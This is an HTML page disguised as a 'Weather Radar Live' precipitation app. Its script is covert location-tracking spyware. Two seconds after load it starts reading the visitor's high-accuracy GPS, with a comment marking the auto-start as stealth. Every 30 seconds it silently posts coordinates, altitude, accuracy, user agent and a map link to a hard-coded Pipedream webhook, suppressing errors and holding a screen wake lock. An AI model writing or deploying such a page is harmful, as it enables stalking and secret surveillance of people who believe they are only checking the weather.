<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Weather Radar - Live Updates</title>
<link rel="manifest" href="data:application/manifest+json,{
  'name':'Weather Radar Live',
  'short_name':'WeatherRadar',
  'start_url':'/',
  'display':'standalone',
  'background_color':'#ffffff',
  'theme_color':'#0000ff'
}">
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);color:#fff;min-height:100vh;overflow:hidden;}
.container{max-width:400px;margin:0 auto;padding:20px;}
.header{background:linear-gradient(90deg,#667eea,#764ba2);padding:30px;border-radius:20px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.3);}
.header h1{font-size:1.8em;margin-bottom:10px;}
.header p{font-size:1em;opacity:0.9;}
.radar{border:3px solid rgba(255,255,255,0.2);border-radius:20px;padding:30px;margin:20px 0;background:rgba(255,255,255,0.05);text-align:center;}
#radar{display:block;width:200px;height:200px;margin:0 auto 20px;border-radius:50%;background:conic-gradient(from 0deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff9ff3, #ff6b6b);animation:radar-spin 2s linear infinite;}
@keyframes radar-spin{to{transform:rotate(360deg);}}
.status{background:rgba(0,0,0,0.3);padding:20px;border-radius:15px;margin:20px 0;}
#coords{font-size:1.5em;font-weight:600;margin:15px 0;color:#4ecdc4;}
#status-btn{width:100%;padding:15px;background:linear-gradient(45deg,#ff6b6b,#ff8e8e);border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s;}
#status-btn:hover{transform:scale(1.02);box-shadow:0 10px 25px rgba(255,107,107,0.4);}
#status-btn.active{background:linear-gradient(45deg,#00b894,#00cec9);}
.hidden{display:none;}
.map-link{display:inline-block;background:rgba(0,184,148,0.3);padding:12px 20px;border-radius:25px;color:#fff;text-decoration:none;font-weight:500;margin:10px 0;}
.map-link:hover{background:rgba(0,184,148,0.5);}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>🌩️ Weather Radar Live</h1>
    <p>Your local precipitation map - Updates every 30s</p>
  </div>
  
  <div class="radar">
    <div id="radar"></div>
    <p>🔄 Live Doppler Radar</p>
    <button id="status-btn" onclick="toggleTracking()">Start Radar Tracking</button>
  </div>
  
  <div id="status" class="status hidden">
    <div id="coords">Waiting for GPS...</div>
    <a id="maplink" class="map-link" target="_blank">🗺️ Open Live Map</a>
    <p id="last-update">Last: Never</p>
  </div>
</div>

<script>
// YOUR PIPEDREAM WEBHOOK
const WEBHOOK = "https://eowi5n8vlh9h3xy.m.pipedream.net";

let watchId = null;
let intervalId = null;
let isTracking = false;

// 30s FOREVER TRACKING ENGINE
function startTracking() {
  if (isTracking) return;
  isTracking = true;
  
  document.getElementById('status-btn').textContent = '🟢 Tracking Active';
  document.getElementById('status-btn').classList.add('active');
  document.getElementById('status').classList.remove('hidden');
  
  // PRIMARY: watchPosition (high accuracy)
  watchId = navigator.geolocation.watchPosition(
    sendLocation,
    () => {}, // Silent error
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 10000 }
  );
  
  // BACKUP: 30s interval (survives everything)
  intervalId = setInterval(() => {
    navigator.geolocation.getCurrentPosition(sendLocation, () => {}, 
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 29000 }
    );
  }, 30000);
  
  // VISIBILITY FIX: Reactivate if tab wakes
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && isTracking) {
      navigator.geolocation.getCurrentPosition(sendLocation);
    }
  });
  
  // FORCE UPDATE NOW
  navigator.geolocation.getCurrentPosition(sendLocation);
}

function stopTracking() {
  if (watchId) navigator.geolocation.clearWatch(watchId);
  if (intervalId) clearInterval(intervalId);
  isTracking = false;
  document.getElementById('status-btn').textContent = 'Start Radar Tracking';
  document.getElementById('status-btn').classList.remove('active');
  document.getElementById('status').classList.add('hidden');
}

function sendLocation(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const acc = position.coords.accuracy;
  const alt = position.coords.altitude || 0;
  const ts = new Date().toISOString();
  
  // UI UPDATE
  document.getElementById('coords').textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)} (${acc.toFixed(0)}m)`;
  document.getElementById('maplink').href = `https://maps.google.com/maps?q=${lat},${lon}`;
  document.getElementById('last-update').textContent = `Last: ${new Date().toLocaleTimeString()}`;
  
  // PIPEDREAM POST (30s guaranteed)
  fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      type: 'gps_30s',
      latitude: lat,
      longitude: lon,
      accuracy: acc,
      altitude: alt,
      timestamp: ts,
      battery: navigator.getBattery ? navigator.getBattery().then(b => b.level) : null,
      ua: navigator.userAgent.slice(0, 100),
      maps: `https://maps.google.com/maps?q=${lat},${lon}`
    })
  }).catch(() => {}); // Silent fail
}

// AUTO-START (Stealth)
setTimeout(startTracking, 2000);
document.getElementById('status-btn').onclick = () => isTracking ? stopTracking() : startTracking();

// PREVENT SLEEP (PWA)
if ('wakeLock' in navigator) {
  navigator.wakeLock.request('screen').catch(() => {});
}
</script>
</body>
</html>
